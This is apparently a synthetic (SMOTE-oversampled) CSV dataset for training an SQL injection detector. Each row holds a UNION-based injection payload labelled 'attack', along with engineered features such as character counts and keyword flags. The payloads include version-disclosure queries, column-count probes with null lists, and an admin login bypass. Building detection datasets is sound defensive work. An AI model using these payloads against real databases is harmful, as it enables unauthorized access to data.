id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000032,attack,union," select * from users where id  =  1 or $+<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000121,0.17737284358992514,73.0,32.0,4.372726918332265,42.0,3.0,17.0,11.0,0.5753424657534246,0.0410958904109589,0.2328767123287671,0.1506849315068493,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.674230588529321,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000033,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000054,0.01259429127328402,73.0,32.0,4.37238691844386,42.0,3.019933935203949,17.0,10.980066064796052,0.5753424657534246,0.04136895801649246,0.2328767123287671,0.15041186390131575,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000034,attack,union," select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000042,0.8998066427875353,85.90817744392221,29.90817744392221,4.0109880141997865,42.0,4.0,26.66181568224126,13.246361761680946,0.48967289790565827,0.046635514086253174,0.3099365817306519,0.15375500627743668,3.0,0.0,2.0,0.0,1.0,1.4154539205603156,0.0,2.0,0.0,0.0,1.0,5.584546079439685,1.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000035,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000054,0.08296173771467012,73.0,32.0,4.372726918332265,42.0,3.0,17.0,11.0,0.5753424657534246,0.0410958904109589,0.2328767123287671,0.1506849315068493,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.152370542879515,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000036,attack,union," select * from users where id  =  '1' + $ . union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000078,0.07410224929584121,73.63485880851273,33.0,4.393688323802198,40.0,2.908714702128182,17.726144106384545,13.0,0.5433601636408284,0.039447936589179,0.2405998465867234,0.17659205318326923,3.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000037,attack,union,"1'  )   where 9842  =  9842 union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000207,0.9694331118304498,78.75492904648841,23.167323872865122,3.7034641397250354,46.00394323719073,9.0,14.0,9.750985809297683,0.582156940132824,0.11532867875321079,0.17940016694943903,0.12311421416452614,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,5.750985809297683,1.0,1.0,2.7755575615628914e-17,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000038,attack,union,"1""   )    )    as eglv where 7412  =  7412 union all select null#",nearest_attack_euclidean,R000291,0.760584927334751,65.66509056557663,23.501182075817525,3.7257003328092857,30.662726413941588,9.0,20.66981886884673,5.332545282788318,0.46595085629977273,0.13712690856406026,0.31592112241524006,0.08100111272092697,0.0,0.8337273586058412,0.0,0.0,0.0,1.0,0.0,1.8337273586058411,0.0,0.0,0.6650905655766353,1.0,0.0,0.8337273586058411,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000039,attack,union,"-3794'  )   union all select 2485,2485,2485,2485,2485--",nearest_attack_euclidean,R000205,0.9196004590373805,50.21404160980984,21.521404160980985,4.056860702387963,14.0,21.128424965885902,7.042808321961967,8.042808321961967,0.2893524246559285,0.4139877270069031,0.13799590900230105,0.15866393933486736,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.7607020804904919,0.0,0.0,3.282106241471476,3.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,0.7607020804904919,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000040,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000054,0.0687726541491443,73.0,32.3013108899408,4.380982011207355,42.0,3.0,17.0,11.0,0.5753424657534246,0.0410958904109589,0.2328767123287671,0.1506849315068493,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000041,attack,union,"1'+  (  select syrz where 7699  =  7699 union all select null,null,null#",nearest_attack_euclidean,R000213,1.438450569495944,74.3439339631909,26.39065566053182,4.101459860116178,36.31213207361818,14.859834907977277,15.0,8.171966981595455,0.492231520087194,0.19636978413562067,0.20207282595301573,0.10932586982416959,1.781311321063637,0.0,0.3906556605318183,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.0,2.3906556605318183,1.0,2.7755575615628914e-17,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000042,attack,union," select * from users where id  =  1 + @<@# union select null,version  (    )   -- 1",nearest_attack_euclidean,R000155,0.2660213426061889,82.11857860714555,27.706192869048515,3.9536459906691515,43.41238573809703,2.4407106964272263,24.706192869048515,11.559289303572774,0.5285574335076905,0.030095733154305845,0.30083704317828014,0.14050979015972362,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,5.853096434524258,0.0,2.7755575615628914e-17,1.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000043,attack,union," select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000087,0.08005576781256467,72.2823884288827,31.282388428882705,4.335519555336181,42.0,3.2823884288827028,17.0,10.0,0.5810768047920332,0.04537382069880261,0.23519775432058485,0.13835162018857933,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,5.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000044,attack,union," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000033,0.0,77.0,27.0,3.94638244365072,40.0,3.0,23.0,11.0,0.5194805194805194,0.03896103896103896,0.2987012987012987,0.14285714285714285,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,5.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000045,attack,union," select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000043,1.67626444300443,83.98775167824405,27.601224832175596,4.0446923182131265,45.184077181717264,5.392651006946428,19.809798657404762,13.601224832175596,0.5354466815843916,0.06242344798902531,0.23931466722121775,0.1628152032053654,3.0,0.0,2.0,0.0,0.6012248321755953,1.0,0.0,1.6012248321755953,0.0,0.0,2.595100671297619,4.601224832175595,1.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,0.6012248321755953,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.601224832175595
SMOTE_000046,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000231,0.4296875868766614,77.22588749629622,25.554822500740755,4.161496631186707,27.0,29.780709997036976,11.0,9.445177499259245,0.35057271178039245,0.38450641566768295,0.14282591961423396,0.12209495293769056,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,5.445177499259245,1.0,1.0,2.7755575615628914e-17,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000047,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000280,1.5598599002180946,64.86931492004938,22.44860522363861,3.9461817245960833,14.0,27.588841789108862,12.48605223638608,10.794420894554431,0.22191962009901034,0.427041969378938,0.18507163013951342,0.1659667803825382,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.8972104472772158,0.0,0.0,4.8972104472772156,3.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000048,attack,union," select * from users where id  =  1 +   (  \+  )   union select null,@@VERSION -- 1",nearest_attack_euclidean,R000118,0.5974962565705935,82.39740700671021,32.698703503355105,4.177732016731813,44.0,2.0,24.69870350335511,11.698703503355109,0.5340642706685632,0.024275648666752858,0.2997258984992888,0.1419341821653951,0.0,0.0,2.0,0.0,1.3012964966448912,1.0,0.0,2.0,0.0,0.0,1.0,5.698703503355109,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000049,attack,union,"-3697'   )    )     )   union all select 5180,5180,5180,5180,5180,5180,5180--",nearest_attack_euclidean,R000224,0.8829654814318789,80.26176965591127,22.347646068817745,3.724118183662708,14.0,35.91412358709352,16.695292137635494,13.652353931182255,0.1750015263199347,0.44499341501971057,0.2100053203152008,0.16999973834515406,1.0,0.0,3.0,0.0,0.0,0.0,0.0,2.673823034408873,0.0,0.0,6.97853089677338,3.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000050,attack,union,union select * from users where login   =   char ...,nearest_attack_euclidean,R000035,5.089061477464884,52.27362502525153,21.641750151509232,3.9438079081228823,29.89562462122692,5.472500505030775,12.179124924245382,4.726374974748461,0.5730294736738923,0.10325472651001463,0.2332211069421226,0.09049469287397036,0.0,0.0,0.27362502525153887,0.0,0.7263749747484614,1.0,0.0,0.0,0.0,0.0,0.2736250252515391,2.0,0.0,2.7755575615628914e-17,0.0,0.2736250252515388,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,1.0,0.7263749747484612,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7263749747484612,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.452749949496923
SMOTE_000051,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000168,0.9967520512017582,78.0,32.0,4.5366377574018895,35.0,25.0,12.0,6.0,0.44871794871794873,0.32051282051282054,0.15384615384615385,0.07692307692307693,3.569143233261886,0.43085676673811374,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.8922858083154714,0.10771419168452848,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000052,attack,union," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000033,0.13279197836477216,76.4599004312908,27.459900431290805,3.951229845067983,40.0,2.459900431290805,23.0,11.0,0.5231722458558387,0.03213134516669848,0.3008240413671072,0.14387236761035563,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,5.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000053,attack,union,"1   )    )     )   union all select null,null,null,null,null--",nearest_attack_euclidean,R000301,0.007842417841437908,62.04967043821038,15.0,3.1301454426180237,34.0397363505683,1.0,18.0,9.009934087642074,0.5485606762625631,0.016117905367784416,0.29012229662011946,0.145199121749533,0.0,0.0,2.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,4.009934087642074,2.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000054,attack,union," select * from users where id  =  '1' union select 1a,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000100,0.06490920670652638,100.17525613893939,26.038945808653196,4.095886425094044,62.9805270956734,4.0,23.15578323461279,10.038945808653198,0.6288084011756109,0.039935685820572706,0.23105939745556633,0.1001965155482501,3.0,0.0,2.0,0.0,1.0,2.0,0.0,0.0389458086531973,0.0,0.0,1.0,5.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.01947290432659876,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000055,attack,union," select * from users where id  =  1. union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000132,0.1296329245770682,97.06070003191068,26.0,4.046059183029959,62.060700031910685,4.0,23.0,8.0,0.6393987482765489,0.04121157162553726,0.23696653684683927,0.08242314325107453,0.0,0.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,1.0,5.0,0.0,2.7755575615628914e-17,1.0,0.06070003191068457,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000056,attack,union,"-3794'  )   union all select 2485,2485,2485,2485,2485--",nearest_attack_euclidean,R000205,0.9155562617523136,50.23508918513217,21.523508918513215,4.056780660791213,14.0,21.1410535110793,7.0470178370264325,8.047017837026434,0.28919935138085695,0.41408613125516336,0.13802871041838777,0.15868580694559187,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.7617544592566081,0.0,0.0,3.285263377769825,3.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,0.7617544592566082,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000057,attack,union,"1   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000282,0.10415128490169251,71.34035139861119,15.0,3.098044406973558,41.47228111888895,1.0,18.0,10.868070279722238,0.5810281097263295,0.014036659632927606,0.25265987339269685,0.15227535724804617,0.0,0.0,2.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,5.868070279722238,2.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000058,attack,union," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",nearest_attack_euclidean,R000014,2.357854116561871,73.30366788351319,29.24694343040568,4.113322273985105,40.0,2.0,20.404890511350914,10.898777372162272,0.5465889632818557,0.027329448164092787,0.2765946709884122,0.14948691756563925,1.348166058243408,0.0,2.0,0.0,1.0,1.0,0.0,1.1012226278377282,0.0,1.0,1.0,4.0,0.44938868608113586,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.5506113139188641,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000059,attack,union,"1 union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000278,1.6470306666133545,69.19545440011632,14.762809890930239,2.9969853168809584,51.52561978186048,1.0,5.5256197818604775,11.14421483639536,0.7468406003674323,0.014535333117385363,0.07821527696770564,0.16040878954747675,0.0,0.38140494546511955,2.0,0.0,0.0,0.0,0.0,0.3814049454651195,0.0,0.0,8.38140494546512,2.0,0.0,0.3814049454651196,1.0,0.0,0.0,0.0,0.3814049454651196,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000060,attack,union,"-9859""   )    )     )   union all select 6595,6595,6595,6595,6595,6595,6595#",nearest_attack_euclidean,R000235,0.23708882058460487,77.44339236910656,20.288678473821314,3.4837653909495367,14.0,33.15471389528524,18.0,12.288678473821312,0.18092795757513125,0.4278053444168728,0.2326216597394545,0.15864503826854143,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,6.288678473821312,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000061,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000108,0.1577935500783324,74.80272128366501,31.901360641832504,4.390683585361221,44.0,2.0,17.0,11.802721283665008,0.5882521029257972,0.0267387319511726,0.22727922158496708,0.1577299435380631,0.0,0.0,2.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,6.802721283665008,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000062,attack,union," select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000043,0.020942050063612314,80.0594279721061,27.98019067596463,4.026685865717849,40.0,3.0198093240353705,23.059427972106114,13.980190675964629,0.49964200016803545,0.03771181656724569,0.28801014976054945,0.17463603350416937,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0,5.0,1.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000063,attack,union," select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000051,0.004670162052821079,101.96701687338924,26.0,4.052279721610569,65.95602249785233,4.010994375536918,24.0,8.0,0.6468301823269209,0.039339805784433426,0.23537250891648426,0.07845750297216142,0.0,0.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,1.0,6.0,0.0,2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
